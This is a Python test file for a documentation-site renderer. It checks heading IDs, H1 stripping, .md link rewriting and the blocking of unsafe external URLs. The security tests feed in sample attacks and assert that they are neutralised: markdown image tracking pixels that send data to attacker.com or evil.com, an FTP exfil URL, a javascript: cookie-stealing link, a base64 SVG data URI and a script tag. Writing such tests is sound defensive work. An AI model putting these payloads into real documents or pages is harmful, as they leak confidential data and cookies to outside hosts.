#!/usr/bin/env python3
# Copyright 2026 Google LLC
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

"""Tests for site.py renderer fixes (#144).

Covers:
- Duplicate H1 elimination: exactly one H1 per page (template-supplied)
- Heading anchor IDs: every heading carries an ``id`` attribute
- Heading ID slugification: lowercase, hyphens, no special chars
- Duplicate heading text: unique IDs via ``-1``, ``-2`` suffixes
- Internal .md link rewriting: no ``href`` ending in ``.md`` survives
- External .md URLs preserved: not rewritten
- Anchor fragments preserved across rewrites

Run with:
    PYTHONPATH=tools python3 tests/test_site_renderer.py

Exit 0 = all tests passed, exit 1 = at least one failure.
"""

from __future__ import annotations

import re
import sys
import traceback
from pathlib import Path

# ---------------------------------------------------------------------------
# Bootstrap — add tools/ to sys.path so dde is importable
# ---------------------------------------------------------------------------
REPO_ROOT = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(REPO_ROOT / "tools"))

from dde.commands.site import (
    _add_heading_ids,
    _dedent_tables,
    _rewrite_md_links,
    _sanitize_external_urls,
    _slugify_heading,
    _strip_leading_h1,
)

# ---------------------------------------------------------------------------
# Test infrastructure
# ---------------------------------------------------------------------------

_RESULTS: list[tuple[str, bool, str]] = []


def _run(name: str, fn):
    try:
        fn()
        _RESULTS.append((name, True, ""))
    except Exception as exc:
        _RESULTS.append((name, False, f"{exc}\n{traceback.format_exc()}"))


# ---------------------------------------------------------------------------
# Helper — render markdown through the same pipeline as site build
# ---------------------------------------------------------------------------


def _render_pipeline(text: str) -> str:
    """Render markdown through the full site build pipeline."""
    import mistune

    _md = mistune.create_markdown(
        escape=True, plugins=["table", "strikethrough", "math"]
    )
    text = _strip_leading_h1(text)
    text = _dedent_tables(text)
    html = _md(text)
    html = _add_heading_ids(html)
    html = _rewrite_md_links(html)
    html, _ = _sanitize_external_urls(html)
    return html


# ---------------------------------------------------------------------------
# Item 1 — Duplicate H1 elimination
# ---------------------------------------------------------------------------


def test_strip_leading_h1_basic():
    """_strip_leading_h1 removes the first ``# `` heading line."""
    text = "# My Title\n\nSome content here."
    result = _strip_leading_h1(text)
    assert "# My Title" not in result, f"H1 line not stripped: {result!r}"
    assert "Some content here." in result


def test_strip_leading_h1_preserves_h2():
    """_strip_leading_h1 does not remove ``## `` or deeper headings."""
    text = "## Not H1\n\n### Also not H1"
    result = _strip_leading_h1(text)
    assert result == text, f"Non-H1 headings modified: {result!r}"


def test_strip_leading_h1_only_first():
    """_strip_leading_h1 removes only the *first* H1, not subsequent ones."""
    text = "# First\n\n# Second\n\nContent"
    result = _strip_leading_h1(text)
    assert "# First" not in result, f"First H1 not stripped: {result!r}"
    assert "# Second" in result, f"Second H1 was also stripped: {result!r}"


def test_strip_leading_h1_no_heading():
    """_strip_leading_h1 is a no-op when there is no H1."""
    text = "Just plain text.\n\nNo headings at all."
    result = _strip_leading_h1(text)
    assert result == text, f"Text modified when no H1: {result!r}"


def test_exactly_one_h1_per_page():
    """Full pipeline: a markdown doc with ``# Title`` yields zero H1 tags.

    The template supplies the H1, so the rendered body must not contain
    any ``<h1>`` elements.
    """
    md = "# My Page Title\n\n## Section One\n\nContent.\n\n## Section Two\n"
    html = _render_pipeline(md)
    h1_count = len(re.findall(r"<h1[\s>]", html))
    assert h1_count == 0, f"Expected 0 H1 tags in body, got {h1_count}: {html!r}"


# ---------------------------------------------------------------------------
# Item 2 — Heading anchor ID generation
# ---------------------------------------------------------------------------


def test_every_heading_has_id():
    """Every rendered heading (h1-h6) carries an ``id`` attribute."""
    md = (
        "## Heading Two\n\n"
        "### Heading Three\n\n"
        "#### Heading Four\n\n"
        "##### Heading Five\n\n"
        "###### Heading Six\n"
    )
    html = _render_pipeline(md)
    headings = re.findall(r"<(h[1-6])\b[^>]*>", html)
    assert len(headings) == 5, f"Expected 5 headings, found {len(headings)}: {html!r}"
    headings_without_id = re.findall(r"<h[1-6]>", html)
    assert len(headings_without_id) == 0, f"Headings without id: {headings_without_id}"


def test_heading_id_slugified():
    """Heading IDs are slugified: lowercase, hyphens, no special chars."""
    html = _add_heading_ids("<h2>Decision DEC-003</h2>")
    assert 'id="decision-dec-003"' in html, f"Slug wrong: {html!r}"


def test_heading_id_strips_special_chars():
    """Special characters are removed from heading IDs."""
    html = _add_heading_ids("<h3>Results (Phase 1) — Summary!</h3>")
    # Only alphanumeric and hyphens should remain
    match = re.search(r'id="([^"]+)"', html)
    assert match, f"No id attribute found: {html!r}"
    slug = match.group(1)
    assert re.match(r"^[a-z0-9-]+$", slug), f"Slug has invalid chars: {slug!r}"
    assert slug == "results-phase-1-summary", f"Unexpected slug: {slug!r}"


def test_duplicate_heading_ids_unique():
    """Duplicate heading text gets unique IDs with ``-1``, ``-2`` suffixes."""
    html = "<h2>Overview</h2><h2>Overview</h2><h2>Overview</h2>"
    result = _add_heading_ids(html)
    assert 'id="overview"' in result, f"First id missing: {result!r}"
    assert 'id="overview-1"' in result, f"Second id missing: {result!r}"
    assert 'id="overview-2"' in result, f"Third id missing: {result!r}"


def test_heading_id_preserves_existing():
    """Headings that already have an ``id`` attribute are left unchanged."""
    html = '<h2 id="custom-id">Title</h2>'
    result = _add_heading_ids(html)
    assert 'id="custom-id"' in result, f"Existing id overwritten: {result!r}"
    # Should not have a second id
    ids = re.findall(r'id="[^"]+"', result)
    assert len(ids) == 1, f"Multiple ids: {ids}"


def test_heading_id_with_inline_html():
    """Heading IDs are derived from plain text, stripping inline HTML."""
    html = "<h2><strong>Bold</strong> heading</h2>"
    result = _add_heading_ids(html)
    assert 'id="bold-heading"' in result, (
        f"Inline HTML not stripped for slug: {result!r}"
    )


def test_slugify_heading_examples():
    """_slugify_heading produces correct slugs for various inputs."""
    cases = [
        ("Decision DEC-003", "decision-dec-003"),
        ("Hello World", "hello-world"),
        ("  Leading Spaces  ", "leading-spaces"),
        ("ALL CAPS", "all-caps"),
        ("with/special&chars", "withspecialchars"),
        ("multiple   spaces", "multiple-spaces"),
    ]
    for text, expected in cases:
        result = _slugify_heading(text)
        assert result == expected, (
            f"_slugify_heading({text!r}) = {result!r}, expected {expected!r}"
        )


# ---------------------------------------------------------------------------
# Item 3 — Internal .md link rewriting
# ---------------------------------------------------------------------------


def test_md_link_rewritten_to_html():
    """Internal ``.md`` links are rewritten to ``.html``."""
    html = '<a href="other-page.md">link</a>'
    result = _rewrite_md_links(html)
    assert 'href="other-page.html"' in result, f"Link not rewritten: {result!r}"


def test_no_href_ending_in_md():
    """Full pipeline: no ``href`` ending in ``.md`` survives for internal links."""
    md = "## Links\n\nSee [page](other.md) and [sub](dir/deep.md) for details.\n"
    html = _render_pipeline(md)
    # Find all href values
    hrefs = re.findall(r'href="([^"]+)"', html)
    for href in hrefs:
        if href.startswith(("http://", "https://", "//")):
            continue  # external links are allowed to end in .md
        path = href.split("#")[0]
        assert not path.endswith(".md"), f"Internal .md link survived: {href!r}"


def test_external_md_url_not_rewritten():
    """External URLs ending in ``.md`` are NOT rewritten."""
    html = '<a href="https://github.com/org/repo/blob/main/README.md">readme</a>'
    result = _rewrite_md_links(html)
    assert "https://github.com/org/repo/blob/main/README.md" in result, (
        f"External .md URL was rewritten: {result!r}"
    )


def test_external_http_md_not_rewritten():
    """HTTP (not HTTPS) external ``.md`` URLs are NOT rewritten."""
    html = '<a href="http://example.com/docs.md">docs</a>'
    result = _rewrite_md_links(html)
    assert "http://example.com/docs.md" in result, (
        f"HTTP external .md URL was rewritten: {result!r}"
    )


def test_anchor_fragment_preserved():
    """Anchor fragments are preserved in rewritten links."""
    html = '<a href="page.md#section-two">link</a>'
    result = _rewrite_md_links(html)
    assert 'href="page.html#section-two"' in result, (
        f"Fragment not preserved: {result!r}"
    )


def test_subdirectory_md_link_rewritten():
    """Subdirectory references like ``../other/page.md`` are rewritten."""
    html = '<a href="../other/page.md">link</a>'
    result = _rewrite_md_links(html)
    assert 'href="../other/page.html"' in result, (
        f"Subdir link not rewritten: {result!r}"
    )


def test_subdirectory_md_link_with_fragment():
    """Subdirectory reference with fragment is rewritten correctly."""
    html = '<a href="../dir/file.md#anchor">link</a>'
    result = _rewrite_md_links(html)
    assert 'href="../dir/file.html#anchor"' in result, (
        f"Subdir link with fragment not rewritten: {result!r}"
    )


def test_non_md_links_untouched():
    """Links not ending in ``.md`` are left unchanged."""
    html = '<a href="page.html">html</a> <a href="data.json">json</a>'
    result = _rewrite_md_links(html)
    assert result == html, f"Non-.md links modified: {result!r}"


def test_full_pipeline_integration():
    """Integration: full pipeline produces correct output for a realistic document."""
    md = (
        "# Program Summary\n\n"
        "## Overview\n\n"
        "This program targets [key findings](findings/report.md) with "
        "[external ref](https://doi.org/paper.md).\n\n"
        "## Overview\n\n"
        "A second overview section (duplicate heading).\n\n"
        "See [details](analysis.md#methods) for methods.\n"
    )
    html = _render_pipeline(md)

    # No H1 (stripped for template)
    assert "<h1" not in html, f"H1 found in body: {html!r}"

    # All headings have IDs
    headings_without_id = re.findall(r"<h[2-6]>", html)
    assert len(headings_without_id) == 0, f"Headings without id: {html!r}"

    # Duplicate heading IDs are unique
    assert 'id="overview"' in html
    assert 'id="overview-1"' in html

    # Internal .md links rewritten
    assert 'href="findings/report.html"' in html
    assert 'href="analysis.html#methods"' in html

    # External .md URL preserved
    assert "https://doi.org/paper.md" in html


# ---------------------------------------------------------------------------
# Item 4 — External URL sanitization (#170)
# ---------------------------------------------------------------------------


def test_external_image_blocked():
    """External image URL is replaced with a visible marker."""
    md = "## Results\n\n![data exfil](https://attacker.com/log?data=SECRET)\n"
    html = _render_pipeline(md)
    assert "<img" not in html, f"<img> tag survived: {html!r}"
    assert "blocked-image" in html, f"No blocked marker: {html!r}"
    assert "attacker.com" in html, f"URL not shown in marker: {html!r}"


def test_zero_pixel_image_blocked():
    """Zero-pixel invisible image (empty alt text) is blocked."""
    md = "Some findings.\n\n![](https://evil.com/1x1.gif?secret=compound_X)\n\nMore text."
    html = _render_pipeline(md)
    assert "<img" not in html, f"Invisible img survived: {html!r}"
    assert "blocked-image" in html


def test_encoded_url_image_blocked():
    """Image with URL-encoded characters is still blocked."""
    md = "![alt](https://evil.com/%2e%2e/log?d=SECRET)\n"
    html = _render_pipeline(md)
    assert "<img" not in html, f"Encoded URL img survived: {html!r}"
    assert "blocked-image" in html


def test_data_uri_image_blocked():
    """data: URI in image src is blocked.

    Mistune v3+ replaces data: URIs with ``#harmful-link`` before our
    sanitizer runs, so the img tag survives but its src is harmless.
    Our sanitizer catches data: URIs that bypass mistune (e.g. raw HTML
    passed directly).  The security property is: no ``data:`` src
    survives the pipeline.
    """
    md = "![](data:image/svg+xml;base64,PHN2ZyBvbmxvYWQ9ImFsZXJ0KDEpIi8+)\n"
    html = _render_pipeline(md)
    assert "data:" not in html, f"data: URI survived: {html!r}"
    # Also verify the direct sanitizer catches data: URIs at HTML level
    from dde.commands.site import _sanitize_external_urls

    raw_html = '<img src="data:image/svg+xml;base64,PHN2Zy8+" alt="">'
    sanitized, _warnings = _sanitize_external_urls(raw_html)
    assert "<img" not in sanitized, f"data: img survived sanitizer: {sanitized!r}"
    assert "blocked-image" in sanitized


def test_javascript_link_blocked():
    """javascript: href is neutralized."""
    md = "[click me](javascript:alert(document.cookie))\n"
    html = _render_pipeline(md)
    assert "javascript:" not in html, f"javascript: survived: {html!r}"


def test_external_link_preserved_with_safety():
    """External http/https links are kept but get safety attributes."""
    md = "[PubMed](https://pubmed.ncbi.nlm.nih.gov/12345678/)\n"
    html = _render_pipeline(md)
    assert 'href="https://pubmed.ncbi.nlm.nih.gov/12345678/"' in html, (
        f"External link removed: {html!r}"
    )
    assert "noopener" in html, f"Missing noopener: {html!r}"


def test_internal_image_preserved():
    """Relative image paths (internal) are NOT blocked."""
    md = "![chart](images/figure1.png)\n"
    html = _render_pipeline(md)
    assert "<img" in html, f"Internal image was blocked: {html!r}"
    assert 'src="images/figure1.png"' in html
    assert "blocked-image" not in html


def test_http_image_blocked():
    """Plain http:// images are blocked too, not just https://."""
    md = "![](http://attacker.com/log?d=SECRET)\n"
    html = _render_pipeline(md)
    assert "<img" not in html, f"HTTP img survived: {html!r}"
    assert "blocked-image" in html


def test_protocol_relative_image_blocked():
    """Protocol-relative //host/path images are blocked."""
    md = "![](//attacker.com/log?d=SECRET)\n"
    html = _render_pipeline(md)
    assert "<img" not in html, f"Protocol-relative img survived: {html!r}"
    assert "blocked-image" in html


def test_multiple_external_images_all_blocked():
    """Multiple external images in one document are all blocked."""
    md = (
        "## Report\n\n"
        "![](https://a.com/1.gif?d=1)\n"
        "Text between.\n"
        "![](https://b.com/2.gif?d=2)\n"
        "![](https://c.com/3.gif?d=3)\n"
    )
    html = _render_pipeline(md)
    assert "<img" not in html
    assert html.count("blocked-image") == 3


def test_sanitize_returns_warnings():
    """_sanitize_external_urls returns a warning per blocked URL."""
    from dde.commands.site import _sanitize_external_urls

    html_in = (
        '<img src="https://evil.com/x.gif" alt=""><img src="images/ok.png" alt="">'
    )
    html_out, warnings = _sanitize_external_urls(html_in)
    assert len(warnings) == 1, f"Expected 1 warning, got {len(warnings)}: {warnings}"
    assert "evil.com" in warnings[0]
    assert "<img" in html_out  # internal image preserved
    assert 'src="images/ok.png"' in html_out


def test_raw_html_still_blocked():
    """Existing protection: raw HTML tags are still escaped by mistune."""
    md = '<script>alert(1)</script>\n<img src="https://evil.com/x">\n'
    html = _render_pipeline(md)
    assert "<script>" not in html, f"Script tag survived: {html!r}"
    assert "&lt;script&gt;" in html


def test_full_security_integration():
    """Integration: realistic document with mixed content."""
    md = (
        "# Safety Assessment\n\n"
        "## Summary\n\n"
        "The compound shows moderate hERG liability. "
        "See [FDA guidance](https://www.fda.gov/drugs/guidance) for details.\n\n"
        "## Data\n\n"
        "| Assay | IC50 |\n"
        "|---|---|\n"
        "| hERG | 15 µM |\n\n"
        "![](https://attacker.com/log?compound=XYZ-123&target=hERG&ic50=15)\n\n"
        "## References\n\n"
        "![chart](figures/herg-dose-response.png)\n"
    )
    html = _render_pipeline(md)
    # Malicious image blocked
    assert "attacker.com" in html  # visible in marker
    assert '<img src="https://attacker.com' not in html  # but not as a live tag
    # Legitimate internal image preserved
    assert 'src="figures/herg-dose-response.png"' in html
    # Legitimate external link preserved
    assert 'href="https://www.fda.gov/drugs/guidance"' in html
    # Table intact
    assert "<table" in html
    assert "hERG" in html


def test_ftp_image_blocked():
    """FTP/FTPS images are blocked (not just http/https)."""
    md = "![](ftp://attacker.com/exfil?compound=XYZ-123)\n"
    html = _render_pipeline(md)
    assert "<img" not in html, f"FTP img survived: {html!r}"
    assert "blocked-image" in html


# ---------------------------------------------------------------------------
# Runner
# ---------------------------------------------------------------------------

if __name__ == "__main__":
    # Item 1: Duplicate H1
    _run("strip_leading_h1_basic", test_strip_leading_h1_basic)
    _run("strip_leading_h1_preserves_h2", test_strip_leading_h1_preserves_h2)
    _run("strip_leading_h1_only_first", test_strip_leading_h1_only_first)
    _run("strip_leading_h1_no_heading", test_strip_leading_h1_no_heading)
    _run("exactly_one_h1_per_page", test_exactly_one_h1_per_page)

    # Item 2: Heading anchor IDs
    _run("every_heading_has_id", test_every_heading_has_id)
    _run("heading_id_slugified", test_heading_id_slugified)
    _run("heading_id_strips_special_chars", test_heading_id_strips_special_chars)
    _run("duplicate_heading_ids_unique", test_duplicate_heading_ids_unique)
    _run("heading_id_preserves_existing", test_heading_id_preserves_existing)
    _run("heading_id_with_inline_html", test_heading_id_with_inline_html)
    _run("slugify_heading_examples", test_slugify_heading_examples)

    # Item 3: Internal .md link rewriting
    _run("md_link_rewritten_to_html", test_md_link_rewritten_to_html)
    _run("no_href_ending_in_md", test_no_href_ending_in_md)
    _run("external_md_url_not_rewritten", test_external_md_url_not_rewritten)
    _run("external_http_md_not_rewritten", test_external_http_md_not_rewritten)
    _run("anchor_fragment_preserved", test_anchor_fragment_preserved)
    _run("subdirectory_md_link_rewritten", test_subdirectory_md_link_rewritten)
    _run("subdirectory_md_link_with_fragment", test_subdirectory_md_link_with_fragment)
    _run("non_md_links_untouched", test_non_md_links_untouched)
    _run("full_pipeline_integration", test_full_pipeline_integration)

    # Item 4: External URL sanitization (#170)
    _run("external_image_blocked", test_external_image_blocked)
    _run("zero_pixel_image_blocked", test_zero_pixel_image_blocked)
    _run("encoded_url_image_blocked", test_encoded_url_image_blocked)
    _run("data_uri_image_blocked", test_data_uri_image_blocked)
    _run("javascript_link_blocked", test_javascript_link_blocked)
    _run(
        "external_link_preserved_with_safety", test_external_link_preserved_with_safety
    )
    _run("internal_image_preserved", test_internal_image_preserved)
    _run("http_image_blocked", test_http_image_blocked)
    _run("protocol_relative_image_blocked", test_protocol_relative_image_blocked)
    _run(
        "multiple_external_images_all_blocked",
        test_multiple_external_images_all_blocked,
    )
    _run("sanitize_returns_warnings", test_sanitize_returns_warnings)
    _run("raw_html_still_blocked", test_raw_html_still_blocked)
    _run("full_security_integration", test_full_security_integration)
    _run("ftp_image_blocked", test_ftp_image_blocked)

    # Report
    passed = sum(1 for _, ok, _ in _RESULTS if ok)
    failed = sum(1 for _, ok, _ in _RESULTS if not ok)
    total = len(_RESULTS)

    print(f"\n{'=' * 60}")
    for name, ok, err in _RESULTS:
        status = "PASS" if ok else "FAIL"
        print(f"  [{status}] {name}")
        if err:
            for line in err.strip().splitlines():
                print(f"         {line}")
    print(f"{'=' * 60}")
    print(f"  {passed}/{total} passed, {failed} failed")

    sys.exit(0 if failed == 0 else 1)
